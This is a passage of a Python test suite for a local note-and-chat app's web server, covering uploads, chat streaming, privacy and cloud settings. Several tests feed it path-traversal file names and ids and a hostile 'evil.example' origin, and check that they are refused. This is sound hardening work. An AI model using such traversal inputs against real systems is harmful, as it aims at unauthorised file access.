    monkeypatch.setattr(actions, "_popen", lambda args, **k: (started.append(args),
                                                              FakeProc(b"done\n"))[1])
    call(app, "POST", "/api/setup/embed", {})
    wait_job(app)
    assert started[0][1:3] == ["model", "download"]
    assert started[1][1:3] == ["model", "build"]  # the index starts on its own


# ---- private browse search: --private only for LM Studio's opt-in ---------------------------


def _private_on(home, on=True):
    (home / ".keepfold").mkdir(exist_ok=True)
    (home / ".keepfold" / "config.yaml").write_text(
        f"vault: x\nbrowse:\n  private_mcp: {'true' if on else 'false'}\n", encoding="utf-8")


def _home_bytes(home) -> bytes:
    return b"".join(p.read_bytes() for p in home.rglob("*") if p.is_file()
                    and ".keepfold" not in p.parts)


def test_no_target_writes_private_but_lm_studio_opt_in(home):
    for t in targets.targets():  # every app found on this (temp) computer
        for p in t.paths():
            p.parent.mkdir(parents=True, exist_ok=True)
    for d in (".claude", ".gemini", ".codex", "APPDATA/Claude",  # Claude Desktop on Windows,
              "Library/Application Support/Claude", ".config/Claude"):  # macOS, Linux
        (home / d).mkdir(parents=True, exist_ok=True)
    ids = [t.id for t in targets.targets()]
    assert all(targets.by_id()[i].detect() for i in ids)
    done = targets.apply_all({i: True for i in ids}, ENTRY)
    assert {r["id"] for r in done if r["change"] != "error"} == set(ids), done
    assert b"--private" not in _home_bytes(home)

    for on in (False, True):  # the opt-in: refused for all while off, LM Studio only when on
        _private_on(home, on)
        for i in ids:
            rows = targets.plan_all({i: "private"}, ENTRY)
            if on and i == "lmstudio":
                assert [r["change"] for r in rows] == ["update"]
            else:
                assert [r["change"] for r in rows] == ["error"], (i, rows)
                assert targets.apply_all({i: "private"}, ENTRY) == []
        assert b"--private" not in _home_bytes(home)
    targets.apply_all({"lmstudio": "private"}, ENTRY)
    lms = home / ".lmstudio" / "mcp.json"
    assert json.loads(lms.read_text())["mcpServers"]["keepfold"]["args"][-1] == "--private"
    assert targets.by_id()["lmstudio"].private()
    rest = [p for p in home.rglob("*") if p.is_file() and p != lms and ".keepfold" not in p.parts
            and not p.name.endswith(".bak")]
    assert not [p for p in rest if b"--private" in p.read_bytes()]
    targets.apply_all({"lmstudio": True}, ENTRY)  # unticking the opt-in takes it out
    assert "--private" not in lms.read_text() and not targets.by_id()["lmstudio"].private()


def test_connect_offers_private_only_for_lm_studio_when_on(app, home):
    (home / ".lmstudio").mkdir()
    rows = {r["id"]: r for r in call(app, "GET", "/api/connect")[1]["targets"]}
    assert not any(r["private_offer"] for r in rows.values())
    code, plan, _, _ = call(app, "POST", "/api/connect/plan", {"want": {"lmstudio": "private"}})
    assert code == 200 and plan["rows"][0]["change"] == "error"
    assert call(app, "POST", "/api/connect/plan", {"want": {"cursor": "private"}})[0] == 400
    _private_on(home)
    rows = {r["id"]: r for r in call(app, "GET", "/api/connect")[1]["targets"]}
    assert [i for i, r in rows.items() if r["private_offer"]] == ["lmstudio"]
    assert call(app, "POST", "/api/connect/apply", {"want": {"lmstudio": "private"}})[0] == 200
    assert wait_job(app)["error"] is None
    rows = {r["id"]: r for r in call(app, "GET", "/api/connect")[1]["targets"]}
    assert rows["lmstudio"]["private"] and rows["lmstudio"]["connected"]


def test_browsing_privacy_defaults_and_categories(app, home):
    from keepfold import taint
    from keepfold.browse import lists
    s = call(app, "GET", "/api/browse")[1]["settings"]
    assert s["visible_to_claude"] is False and s["private_mcp"] is False  # a new user
    assert s["hidden_from_claude"] == s["categories"] == list(lists.CATEGORIES)
    assert s["skip_categories"] == ["adult"]

    (home / ".keepfold").mkdir(exist_ok=True)
    (home / ".keepfold" / "config.yaml").write_text(
        "vault: V\nrerank: false\nbrowse:\n  browsers: [chrome]\n", encoding="utf-8")
    body = {"visible_to_claude": True, "private_mcp": True, "deny": [], "allow": [],
            "private": [], "hidden_from_claude": ["health", "adult"],
            "skip_categories": ["adult", "betting"]}
    assert call(app, "POST", "/api/browse/settings", body)[0] == 200
    c = taint.config()
    assert c["vault"] == "V" and c["rerank"] is False and c["browse"]["browsers"] == ["chrome"]
    b = c["browse"]
    assert "hidden_from_claude" not in b and b["private_mcp"] is True  # C9: the allowlist
    assert b["cloud_categories"] == [x for x in lists.CATEGORIES
                                     if x not in ("adult", "health")]
    assert b["skip_categories"] == ["adult", "betting"]
    assert (b["adult"], b["sensitive"]) == ("skip", "private")  # legacy pair kept in step
    s = call(app, "GET", "/api/browse")[1]["settings"]
    assert s["visible_to_claude"] and s["private_mcp"] and s["skip_categories"] == [
        "adult", "betting"] and s["hidden_from_claude"] == ["adult", "health"]

    for bad in ({"skip_categories": ["cats"]}, {"hidden_from_claude": "health"},
                {"private_mcp": "yes"}):
        assert call(app, "POST", "/api/browse/settings", {**body, **bad})[0] == 400
    assert call(app, "POST", "/api/browse/settings", {**body, "private_mcp": False})[0] == 200
    assert taint.config()["browse"]["private_mcp"] is False


# ---- onboarding: runner start, one-click model, guided imports -----------------------------

EXPORTS = Path(__file__).parent / "fixtures" / "exports"
NEW_POSTS = ("/api/import/upload", "/api/import/preview", "/api/import/run", "/api/setup/start",
             "/api/setup/model", "/api/update/check", "/api/update/apply")


def upload(app, data: bytes, name: str, *, length: int | None = None,
           ctype="application/octet-stream", token=True) -> tuple[int, dict | None]:
    """A raw upload; `length` may claim more than is sent (the body is then not sent)."""
    with socket.create_connection(("127.0.0.1", app.port), timeout=30) as s:
        head = ["POST /api/import/upload HTTP/1.1", f"Host: 127.0.0.1:{app.port}",
                f"Content-Type: {ctype}", f"X-Keepfold-Name: {name}",
                f"Content-Length: {len(data) if length is None else length}",
                "Connection: close"] + ([f"X-Keepfold-Token: {app.token}"] if token else [])
        s.sendall(("\r\n".join(head) + "\r\n\r\n").encode() + (data if length is None else b""))
        raw = b""
        while chunk := s.recv(65536):
            raw += chunk
    head, _, body = raw.partition(b"\r\n\r\n")
    return int(head.split()[1]), json.loads(body) if body else None


def test_new_routes_need_the_key_and_the_origin(app):
    for path in NEW_POSTS:
        assert call(app, "POST", path, {}, token=False)[0] == 401, path
        assert call(app, "POST", path, {}, origin="http://evil.example")[0] == 403, path
        assert call(app, "GET", path)[0] == 405, path
    assert upload(app, b"[]", "a.json", token=False)[0] == 401


def test_upload_is_capped_named_by_the_app_and_typed(app, home):
    code, body = upload(app, b"", "big.zip", length=4 * 2**30 + 1)
    assert code == 413 and "4 GB" in body["error"]
    assert upload(app, b"MZ", "tool.exe")[0] == 400
    assert upload(app, b"[]", "a.json", ctype="application/json")[0] == 415
    data = (EXPORTS / "chatgpt_conversations.json").read_bytes()
    code, body = upload(app, data, "..%5C..%5Cevil%20name.JSON")  # the client's path is ignored
    assert code == 200 and body["size"] == len(data)
    files = list((home / ".keepfold" / "tmp").iterdir())
    assert [p.name for p in files] == [f"upload-{body['upload']}-evilname.json"]
    assert files[0].read_bytes() == data and app.uploads[body["upload"]] == files[0]


def test_upload_keeps_localized_activity_names_and_nothing_hostile(app, home):
    """Takeout's localized My Activity names stay ones activity_file knows; a path, a dot or a
    device name can never reach the file name (the upload-<hex>- prefix comes first)."""
    from keepfold.browse import takeout
    names = {"MeineAktivitäten.json": "MeineAktivitäten.json",
             "マイアクティビティ.json": "マイアクティビティ.json",
             "मेरी गतिविधि.json": "मेरीगतिविधि.json",
             "..\\..\\CON.json": "CON.json", "a:b.c/../NUL .json": "NUL.json"}
    for raw, kept in names.items():
        code, body = upload(app, b"[]", quote(raw))
        assert code == 200, raw
        p = app.uploads[body["upload"]]
        assert p.parent == home / ".keepfold" / "tmp"
        assert p.name == f"upload-{body['upload']}-{kept}", raw
        if "CON" not in raw and "NUL" not in raw:
            assert takeout.activity_file(p.name) == "json", raw


def test_job_times_ignore_a_wall_clock_change(monkeypatch):
    job = server.Job("Import", "import", False)
    job.progress(1, 2, 1, 2, "Reading")
    monkeypatch.setattr(time, "time", lambda: 0.0)  # the clock set back to 1970 mid-job
    v = job.view()
    assert 0 <= v["seconds"] < 5 and v["progress"]["overall"] == 25


def test_port_reuse_only_where_it_skips_time_wait():
    """POSIX reuses an address in TIME_WAIT; Windows' SO_REUSEADDR would share a live port."""
    assert server._Server.allow_reuse_address is (os.name != "nt")


def test_tidy_about_me_starts_no_index_build(app, monkeypatch):
    """Tidy reads me/ pages only, so its Keepfold builds no Index (one each pass otherwise)."""
    from keepfold.mcp_server import Keepfold
    builds = []

    def no_build(self):
        builds.append(1)
        raise AssertionError("tidy needed the index")
    monkeypatch.setattr(Keepfold, "_build_index", lambda self: builds.append(1))
    monkeypatch.setattr(Keepfold, "index", property(no_build))
    assert set(app.tidy_about_me()) >= {"moved", "retired"}
    assert builds == []


def test_guided_chat_import_previews_then_imports(app, home):
    from keepfold import chats
    data = (EXPORTS / "chatgpt_conversations.json").read_bytes()
    _, up = upload(app, data, "conversations.json")
    out = chats.export_root() / "chatgpt"
    assert call(app, "POST", "/api/import/preview", {"source": "chatgpt",
                                                     "upload": up["upload"]})[0] == 200
    job = wait_job(app)
    r = job["result"]
    assert job["error"] is None and r["kind"] == "import-preview" and r["already"] == 0
    assert r["found"] >= 1 and r["lines"][0].startswith("Found ")
    assert not out.exists()  # a dry run: nothing imported
    assert list((home / ".keepfold" / "tmp").iterdir()) == [app.uploads[up["upload"]]]
    call(app, "POST", "/api/import/run", {"source": "chatgpt", "upload": up["upload"]})
    job = wait_job(app)
    assert job["error"] is None and job["result"]["counts"]["conversations"] == r["found"]
    assert len(list(out.glob("*.jsonl"))) == r["found"] and str(out) in job["result"]["lines"][0]
    assert up["upload"] not in app.uploads and not list((home / ".keepfold" / "tmp").iterdir())
    # the path field, and the card's status
    call(app, "POST", "/api/import/preview", {"source": "chatgpt",
                                              "path": str(EXPORTS / "chatgpt_conversations.json")})
    assert wait_job(app)["result"]["already"] == r["found"]
    _, s, _, _ = call(app, "GET", "/api/setup")
    assert s["imports"]["chatgpt"]["count"] == r["found"] and s["imports"]["claude"]["count"] == 0
    assert set(s["guides"]) >= {"claude", "chatgpt", "gemini", "perplexity", "google-activity"}
    # a failing preview deletes the upload
    _, bad = upload(app, b"not json", "x.json")
    call(app, "POST", "/api/import/preview", {"source": "claude", "upload": bad["upload"]})
    assert wait_job(app)["error"] and bad["upload"] not in app.uploads
    for body in ({"source": "myspace", "path": str(EXPORTS)}, {"source": "chatgpt"},
                 {"source": "chatgpt", "path": "relative/x.zip"},
                 {"source": "chatgpt", "path": str(home / "missing.zip")},
                 {"source": "chatgpt", "upload": "nope"}):
        assert call(app, "POST", "/api/import/preview", body)[0] == 400, body


def test_google_activity_goes_through_the_browse_import(app, home, monkeypatch):
    from keepfold import semantic
    from keepfold.browse import build, sources
    monkeypatch.setattr(sources, "discover", lambda *a, **k: [])
    path = str(EXPORTS / "takeout_MyActivity.json")
    seen: list[bytes] = []
    call(app, "POST", "/api/import/preview", {"source": "google-activity", "path": path})
    job = wait_job(app, seen)
    assert job["result"]["found"] >= 1 and "privacy filter" in job["result"]["note"]
    assert job["result"]["need"] == "embed"  # said at Check already (R3-3)
    _, up = upload(app, Path(path).read_bytes(), "MyActivity.json")
    call(app, "POST", "/api/import/run", {"source": "google-activity", "upload": up["upload"]})
    assert wait_job(app, seen)["result"]["need"] == "embed"  # no search model yet
    assert up["upload"] in app.uploads  # kept, to retry once the model is in
    runs = []

    def fake_run(v, srcs, settings, *, takeout=None, **kw):
        runs.append(takeout)
        return {"sources": 0, "takeout": len(takeout), "private_written": 2,
                "days_from": "2026-09-28"}
    monkeypatch.setattr(build, "run", fake_run)
    monkeypatch.setattr(semantic, "load_embedder", lambda *a, **k: lambda texts: None)
    call(app, "POST", "/api/import/run", {"source": "google-activity", "path": path})
    job = wait_job(app, seen)
    assert job["error"] is None and len(runs[0]) >= 1
    assert job["result"]["counts"]["google_rows_used"] == len(runs[0])
    assert "browse" in job["result"]["lines"][0]
    assert b"Dijkstra" not in b"".join(seen)  # counts and dates only


def test_setup_start_and_one_click_model(app, monkeypatch):
    from keepfold import localllm, taint
    started = []
    monkeypatch.setattr(wizard, "start", lambda r: (started.append(r),
                                                     {"ok": True, "lines": ["running"]})[1],
                        raising=False)
    call(app, "POST", "/api/setup/start", {"runner": "ollama"})
    assert wait_job(app)["result"]["ok"] and started == ["ollama"]
    assert call(app, "POST", "/api/setup/start", {"runner": "vllm"})[0] == 400

    class Fake:
        def describe(self):
            return "ollama qwen3.5:2b"

        def classify(self, text, labels):
            return "programming", 0.9
    monkeypatch.setattr(targets, "_which", lambda c: "C:\\o\\ollama.exe" if c == "ollama"
                        else None)
    monkeypatch.setattr(status, "ollama_models", lambda: [])
    pulled = []
    monkeypatch.setattr(actions, "_popen", lambda args, **k: (pulled.append(args),
                                                              FakeProc(b"success\n"))[1])
    monkeypatch.setattr(localllm, "find", lambda config=None, **_: Fake())
    call(app, "POST", "/api/setup/model", {"model": "2b", "runner": "ollama"})
    job = wait_job(app)
    assert job["error"] is None and pulled == [["C:\\o\\ollama.exe", "pull", "qwen3.5:2b"]]
    assert job["result"]["answer"] == "programming"  # pull, then Test
    assert taint.config()["localllm"]["model"] == "qwen3.5:2b"


# ---- chat, the audience control, cloud settings, setup order --------------------------------


@pytest.fixture
def embed(monkeypatch):
    from conftest import FakeEmbed

    from keepfold import semantic
    monkeypatch.setattr(semantic, "_embedder", FakeEmbed())


@pytest.fixture
def llm(monkeypatch):
    """A fake Ollama streaming an answer that cites passage 1; `localllm.find` returns it."""
    from test_chat import Stream

    from keepfold import cloudllm, localllm
    s = Stream("ollama", ["Move the pointer", " on the smaller side [1]."], delay=0.01)
    monkeypatch.setattr(localllm, "find", lambda config=None, **_: s.runner())
    monkeypatch.setattr(cloudllm, "find", lambda *a, **k: pytest.fail("cloud runner used"))
    yield s
    s.close()


def chat_stream(app, body, *, token=True, origin=None):
    """POST /api/chat; (status, headers, [events])."""
    c = http.client.HTTPConnection("127.0.0.1", app.port, timeout=30)
    headers = {"Host": f"127.0.0.1:{app.port}", "Content-Type": "application/json"}
    if token:
        headers["X-Keepfold-Token"] = app.token
    if origin:
        headers["Origin"] = origin
    c.request("POST", "/api/chat", body=json.dumps(body).encode(), headers=headers)
    r = c.getresponse()
    raw = r.read()
    c.close()
    if r.status != 200:
        return r.status, r, json.loads(raw)
    return r.status, r, [json.loads(line) for line in raw.decode().splitlines() if line]


def test_chat_test_runs_as_a_job_on_a_click(app, monkeypatch):
    from keepfold import chat_eval

    asked = []
    q = {"id": "Q01", "question": "How many?", "status": "fail", "why": ["missing '23'"],
         "answer": "<b>22</b>"}
    rep = {"passed": 13, "ran": 14, "blocked": 26, "total": 40, "pass_bar": 35, "model": None,
           "model_note": "no local model", "stopped": False, "result": "BLOCKED",
           "manifest": "ab" * 32, "queries": {"lexical": {"rate": "9/9 (100%)"}},
           "misses": {"pool": ["Q16"], "ordering": []},
           "blockers": [{"name": "Private leak", "ids": ["Q35"], "state": "ok", "failed": []}],
           "questions": [q, {**q, "id": "Q02", "status": "pass", "why": []}],
           "retrieval": {"recall": {"@1": "no data"}}, "latency": {"median": 0.1}}

    def run(**k):
        asked.append(k)
        k["progress"](1, 40, "Q01")
        return rep
    monkeypatch.setattr(chat_eval, "run", run)
    assert call(app, "POST", "/api/chat/eval", {}, token=False)[0] == 401
    assert call(app, "POST", "/api/chat/eval", {})[0] == 200
    job = wait_job(app)
    assert (job["section"], job["error"]) == ("chat", None)
    assert asked and set(asked[0]) == {"cancel", "progress"}  # with whatever model is loaded
    r = job["result"]
    assert (r["kind"], r["passed"], r["ran"], r["model_note"]) == (
        "chat_eval", 13, 14, "no local model")
    assert r["failures"] == [{"id": "Q01", "question": "How many?", "why": "missing '23'",
                              "answer": "<b>22</b>"}]  # app.js shows it as text
    assert r["blockers"] == [{"name": "Private leak", "state": "ok"}]
    assert (r["result"], r["manifest"], r["queries"], r["misses"]) == (
        "BLOCKED", "ab" * 6, {"lexical": "9/9 (100%)"}, {"pool": 1, "ordering": 0})


def test_chat_needs_the_key_and_the_origin(app):
    assert chat_stream(app, {"text": "x"}, token=False)[0] == 401
    assert chat_stream(app, {"text": "x"}, origin="http://evil.example")[0] == 403
    for path in ("/api/chat", "/api/chat/list", "/api/chat/settings"):
        assert call(app, "GET", path, token=False)[0] == 401
    for bad in ({}, {"text": "  "}, {"text": 3}, {"text": "x" * 4001},
                {"text": "hi", "id": "../../config"}, {"text": "hi", "id": 5}):
        assert chat_stream(app, bad)[0] == 400, bad
    assert call(app, "GET", "/api/chat/get?id=..%2F..%2Fx")[0] == 400
    assert call(app, "POST", "/api/chat/delete", {"id": "../x"})[0] == 400


def test_chat_state_names_every_missing_piece(app, monkeypatch):
    from keepfold import localllm
    monkeypatch.setattr(localllm, "find", lambda config=None, **_: None)
    code, js, _, _ = call(app, "GET", "/api/chat")
    assert code == 200 and js["missing"] == ["embed", "llm"] and js["chats"] == []
    assert js["settings"]["length"] == "normal"

    def refused(config=None):
        raise ValueError("localllm: a cloud model is refused")
    monkeypatch.setattr(localllm, "find", refused)
    js = call(app, "GET", "/api/chat")[1]
    assert "llm" in js["missing"] and "cloud model" in js["llm_error"]


def test_chat_streams_ndjson_and_keeps_the_chat(app, embed, llm, vault):
    code, r, ev = chat_stream(app, {"text": "two pointers"})
    assert code == 200 and r.getheader("Content-Type") == "application/x-ndjson"
    assert r.getheader("Content-Length") is None and "default-src" in r.getheader(
        "Content-Security-Policy") and r.getheader("X-Content-Type-Options") == "nosniff"
    assert [e["t"] for e in ev][0] == "start" and ev[-1]["t"] == "done"
    assert "".join(e["s"] for e in ev if e["t"] == "tok").endswith("[1].")
    src = next(e for e in ev if e["t"] == "src")["sources"]
    assert src[0]["n"] == 1 and src[0]["path"].endswith(".md")
    cid = ev[-1]["id"]
    assert (vault / ".keepfold" / "browse" / "chat" / f"{cid}.jsonl").is_file()
    assert call(app, "GET", "/api/chat/list")[1]["chats"][0]["id"] == cid
    got = call(app, "GET", f"/api/chat/get?id={cid}")[1]
    assert [m["role"] for m in got["messages"]] == ["user", "assistant"]
    assert got["remembers"] == 0 == ev[-1]["remembers"]  # the model still gets every message
    # a follow-up in the same chat; then the answer's source opens in Obsidian
    ev = chat_stream(app, {"id": cid, "text": "and why?"})[2]
    assert ev[-1]["id"] == cid and len(llm.bodies[-1]["messages"]) == 4
    assert call(app, "POST", "/api/open", {"what": "page", "path": src[0]["path"]})[0] == 200
    # the cited passage itself, under the switches of now; never with no key or a bad path
    q = f"path={quote(src[0]['path'])}&at={src[0]['at']}&len={src[0]['len']}"
    code, got, _, _ = call(app, "GET", "/api/chat/passage?" + q)
    assert code == 200 and got["text"] and got["kind"] == src[0]["kind"]
    assert call(app, "GET", "/api/chat/passage?" + q, token=False)[0] == 401
    assert call(app, "GET", "/api/chat/passage?path=..%2F..%2Fx.md")[0] == 400
    off = {k: False for k in ("notes", "chats", "browsing", "private")}
    assert call(app, "POST", "/api/chat/settings", {"sources": off})[0] == 200
    assert call(app, "GET", "/api/chat/passage?" + q)[0] == 400
    assert call(app, "POST", "/api/chat/delete", {"id": cid})[1] == {"deleted": 1}
    assert call(app, "POST", "/api/chat/delete", {"all": True})[1] == {"deleted": 0}


def test_a_second_chat_stream_is_409_and_a_job_does_not_block_chat(app, embed, llm):
    llm.pieces = [f"w{i} " for i in range(40)]
    llm.delay = 0.05
    first = threading.Thread(target=chat_stream, args=(app, {"text": "two pointers"}))
    first.start()
    for _ in range(100):
        if app.chatting.locked():
            break
        time.sleep(0.02)
    code, _, js = chat_stream(app, {"text": "again"})
    assert code == 409 and "still being written" in js["error"]
    # deleting now would be undone by the answer's final save
    assert call(app, "POST", "/api/chat/delete", {"all": True})[0] == 409
    first.join(10)
    assert not app.chatting.locked()
    hold = threading.Event()
    app.jobs.start("A long import", "setup", lambda job: hold.wait(10))
    llm.delay, llm.pieces = 0, ["ok [1]"]
    try:
        assert chat_stream(app, {"text": "two pointers"})[2][-1]["t"] == "done"
    finally:
        hold.set()


def test_a_closed_page_cancels_and_keeps_the_partial_answer(app, embed, llm, vault):
    import socket as sock
    llm.pieces = [f"w{i} " for i in range(200)]
    llm.delay = 0.02
    body = json.dumps({"text": "two pointers"}).encode()
    s = sock.create_connection(("127.0.0.1", app.port))
    s.sendall(b"POST /api/chat HTTP/1.1\r\nHost: 127.0.0.1:%d\r\nX-Keepfold-Token: %s\r\n"
              b"Content-Type: application/json\r\nContent-Length: %d\r\n\r\n"
              % (app.port, app.token.encode(), len(body)) + body)
    got = b""
    while b'"tok"' not in got:
        got += s.recv(4096)
    s.close()
    for _ in range(300):
        if not app.chatting.locked():
            break
        time.sleep(0.05)
    assert not app.chatting.locked() and llm.sent < 200
    from keepfold import chat
    from keepfold.vault import Vault
    last = chat.load(Vault(vault), chat.list(Vault(vault))[0]["id"])[-1]
    assert last["role"] == "assistant" and last["stopped"] is True


def test_a_page_closed_while_the_model_reasons_frees_the_slot_early(app, embed, llm,
                                                                    monkeypatch):
    # reasoning chunks write nothing to the page; the keepalive notices the closed page
    import socket as sock

    from keepfold.app import server as srv
    monkeypatch.setattr(srv, "KEEPALIVE_S", 0.05)
    llm.kind, llm.think, llm.delay, llm.pieces = "openai", 400, 0.01, ["late"]
    body = json.dumps({"text": "two pointers"}).encode()
    s = sock.create_connection(("127.0.0.1", app.port))
    s.sendall(b"POST /api/chat HTTP/1.1\r\nHost: 127.0.0.1:%d\r\nX-Keepfold-Token: %s\r\n"
              b"Content-Type: application/json\r\nContent-Length: %d\r\n\r\n"
              % (app.port, app.token.encode(), len(body)) + body)
    got = b""
    while b'"think"' not in got:
        got += s.recv(4096)
    s.close()
    for _ in range(300):
        if not app.chatting.locked():
            break
        time.sleep(0.02)
    assert not app.chatting.locked() and llm.sent < 300  # stopped well before the answer


def test_chat_settings_round_trip(app, home):
    code, js, _, _ = call(app, "POST", "/api/chat/settings", {"length": "short",
                                                              "sources": {"private": False}})
    assert code == 200 and js["length"] == "short" and js["sources"]["private"] is False
    assert call(app, "GET", "/api/chat/settings")[1]["length"] == "short"
    for bad in ({"length": "x"}, {"temperature": -1}, {"passages": 2}, {"history": 1},
                {"sources": {"cloud": True}}, {"api_key": "x"}):
        assert call(app, "POST", "/api/chat/settings", bad)[0] == 400, bad


def test_open_page_only_inside_the_vault(app, fakes, vault):
    assert call(app, "POST", "/api/open", {"what": "page", "path": "notes/x.md"})[0] == 400
    for bad in ("../outside.md", str(vault / "concepts" / "two-pointers.md"), "concepts/none.md",
                ".keepfold/config.md", 5):
        assert call(app, "POST", "/api/open", {"what": "page", "path": bad})[0] == 400, bad


def _browse_body(**extra):
    return {"visible_to_claude": True, "private_mcp": False, "deny": [], "allow": [],
            "private": [], **extra}


def test_audience_control_round_trip(app, home):
    from keepfold import taint
    from keepfold.browse import lists, load_settings, privacy
    (home / ".keepfold").mkdir(exist_ok=True)
    (home / ".keepfold" / "config.yaml").write_text(
        "vault: V\nbrowse:\n  browsers: [chrome]\n  cloud_processing: true\n", encoding="utf-8")
    want = {c: "local" for c in lists.CATEGORIES} | {"adult": "skip", "betting": "skip",
                                                     "money": "cloud"}
    assert call(app, "POST", "/api/browse/settings", _browse_body(audience=want))[0] == 200
    c = taint.config()
    b = c["browse"]
    assert c["vault"] == "V" and b["browsers"] == ["chrome"] and b["cloud_processing"] is True
    assert b["skip_categories"] == ["adult", "betting"]
    assert b["cloud_categories"] == [x for x in lists.CATEGORIES  # skip still wins
                                     if x in ("adult", "betting", "money")]
    assert "hidden_from_claude" not in b
    s = load_settings()
    assert {x: privacy.audience(x, s) for x in lists.CATEGORIES} == want
    got = call(app, "GET", "/api/browse")[1]["settings"]["audience"]
    assert got == want
    for bad in ({**want, "money": "everyone"}, {"adult": "skip"}, {**want, "cats": "skip"}, []):
        assert call(app, "POST", "/api/browse/settings", _browse_body(audience=bad))[0] == 400


def test_cloud_settings_off_by_default_https_and_no_key_field(app, home, vault, monkeypatch):
    from keepfold import cloudllm, taint
    cloud = call(app, "GET", "/api/browse")[1]["cloud"]
    assert cloud["cloud_processing"] is False and cloud["provider"] is None
    assert cloud["key_set"] is False and cloud["runs"] == []
    assert set(cloud["presets"]) == set(cloudllm.PRESETS)
    (home / ".keepfold").mkdir(exist_ok=True)
    (home / ".keepfold" / "config.yaml").write_text(
        "vault: V\ncloudllm:\n  max_items: 50\nbrowse:\n  visible_to_claude: true\n",
        encoding="utf-8")
    body = {"cloud_processing": True, "provider": "custom", "model": "gpt-x",
            "base_url": "https://llm.example/v1", "api_key_env": "MY_CLOUD_KEY"}
    for bad in ({"base_url": "http://llm.example/v1"}, {"base_url": "https://u@llm.example"},
                {"api_key_env": "sk-abcdef0123456789"}, {"api_key_env": "A B"},
                {"api_key_env": "AIzaSyA1234567890abcdefghijklmnopqrstu"},
                {"provider": "acme"}, {"model": "x y"}, {"cloud_processing": "yes"},
                {"api_key": "sk-abcdef0123456789"}, {"key": "x"}, {"token": "x"},
                {"secret": "x"}):
        code, js, _, _ = call(app, "POST", "/api/browse/cloud", {**body, **bad})
        assert code == 400, bad
    assert "cloudllm" not in taint.config() or taint.config()["cloudllm"] == {"max_items": 50}
    assert call(app, "POST", "/api/browse/cloud", body)[0] == 200
    c = taint.config()
    assert c["cloudllm"] == {"max_items": 50, "provider": "custom", "model": "gpt-x",
                             "base_url": "https://llm.example/v1", "api_key_env": "MY_CLOUD_KEY"}
    assert c["browse"] == {"visible_to_claude": True, "cloud_processing": True}
    assert call(app, "POST", "/api/browse/cloud", {**body, "provider": "openai"})[0] == 200
    assert "base_url" not in taint.config()["cloudllm"]  # a preset's base is its own

    monkeypatch.setenv("MY_CLOUD_KEY", "sk-VALUEMARKER0123456789")
    (vault / ".keepfold" / "cloud-log.jsonl").write_text(
        '{"ts": "2026-11-18T10:00:00Z", "provider": "openai", "model": "gpt-x", "items": 3, '
        '"chars": 900, "skipped": 1}\nnot json\n', encoding="utf-8")
    _, js, raw, _ = call(app, "GET", "/api/browse")
    assert js["cloud"]["key_set"] is True and b"VALUEMARKER" not in raw
    assert js["cloud"]["runs"] == [{"ts": "2026-11-18T10:00:00Z", "provider": "openai",
                                    "model": "gpt-x", "items": 3, "chars": 900, "skipped": 1}]
    assert call(app, "POST", "/api/browse/cloud", {**body, "cloud_processing": False})[0] == 200
    assert taint.config()["browse"]["cloud_processing"] is False


def test_setup_order_connects_apps_before_the_local_model(app):
    _, s, _, _ = call(app, "GET", "/api/setup")
    assert s["order"] == ["vault", "connect", "embed", "history", "llm"]
    js = (server.ASSETS / "app.js").read_text(encoding="utf-8")
    assert "d.order" in js  # the page follows the server's order


def test_import_preview_writes_nothing(app, home):
    from keepfold import chats
    call(app, "POST", "/api/import/preview", {
        "source": "chatgpt", "path": str(EXPORTS / "chatgpt_conversations.json")})
    r = wait_job(app)["result"]
    assert r["found"] >= 1 and r["already"] == 0 and not list(chats.export_root().rglob("*"))
    assert "KEEPFOLD_CHAT_EXPORT_DIR" not in (Path(actions.__file__)).read_text(encoding="utf-8")


# ---- board2 fixes: the import front door, Ask's missing pieces, cloud form, hardening -----


def test_notes_and_calendar_cards_go_through_importers(app, home, vault):
    """R3-1: the notes and calendar cards have guides, preview with the importer's dry run
    (nothing written) and import as `keepfold import` does."""
    from keepfold import importers
    _, s, _, _ = call(app, "GET", "/api/setup")
    for kind in ("notes", "calendar"):
        assert s["guides"][kind]["steps"] == importers.GUIDES[kind]["steps"]
    before = snapshot(vault / "resources")
    call(app, "POST", "/api/import/preview", {"source": "notes", "path": str(EXPORTS / "notion")})
    job = wait_job(app)
    r = job["result"]
    assert job["error"] is None and r["found"] == 2 and "Notion" in r["lines"][0]
    call(app, "POST", "/api/import/preview", {"source": "calendar",
                                              "path": str(EXPORTS / "calendar.ics")})
    r = wait_job(app)["result"]
    assert r["found"] == 3 and "3 events" in r["lines"][0]
    assert snapshot(vault / "resources") == before  # dry runs
    call(app, "POST", "/api/import/run", {"source": "notes", "path": str(EXPORTS / "obsidian")})
    job = wait_job(app)
    assert job["error"] is None and job["result"]["counts"] == {"notes": 4}
    assert len(list((vault / "resources").glob("obsidian-*.md"))) == 4
    call(app, "POST", "/api/import/run", {"source": "calendar",
                                          "path": str(EXPORTS / "calendar.ics")})
    assert wait_job(app)["result"]["counts"] == {"events": 3}
    assert list((vault / "resources").glob("calendar-*.md"))
    _, up = upload(app, (EXPORTS / "calendar.ics").read_bytes(), "my calendar.ics")
    call(app, "POST", "/api/import/preview", {"source": "calendar", "upload": up["upload"]})
    assert wait_job(app)["result"]["found"] == 0  # every event is already in


def test_notes_and_calendar_import_asks_the_tier_and_remembers_it(app, home, vault):
    """C2: the preview names the tier to preselect (last choice, else the default); Import
    sends the page's choice, which is remembered."""
    from keepfold import sources
    from keepfold.vault import Vault
    ics = {"source": "calendar", "path": str(EXPORTS / "calendar.ics")}
    call(app, "POST", "/api/import/preview", ics)
    assert wait_job(app)["result"]["tier"] == "cloud"
    call(app, "POST", "/api/import/run", {**ics, "tier": "skip"})
    r = wait_job(app)["result"]
    assert r["counts"] == {"events": 0} and not list((vault / "resources").glob("calendar-*"))
    call(app, "POST", "/api/import/preview", ics)
    r = wait_job(app)["result"]
    assert r["tier"] == "skip" and r["found"] == 3  # counted as if imported, so Import is on
    call(app, "POST", "/api/import/run", {**ics, "tier": "local"})
    assert wait_job(app)["result"]["counts"] == {"events": 3}
    assert (vault / "resources" / "calendar-private-2026-11.md").is_file()
    assert sources.remembered(Vault(vault)) == {"calendar": sources.Audience.LOCAL}
    # a bad tier is refused before the job, so the upload is kept for a second try
    _, up = upload(app, (EXPORTS / "calendar.ics").read_bytes(), "my calendar.ics")
    run = {"source": "calendar", "upload": up["upload"]}
    for bad in ("public", ["local"], {"a": 1}):
        code, body, _, _ = call(app, "POST", "/api/import/run", {**run, "tier": bad})
        assert code == 400 and "tier must be one of" in body["error"], bad
    call(app, "POST", "/api/import/run", {**run, "tier": "local"})
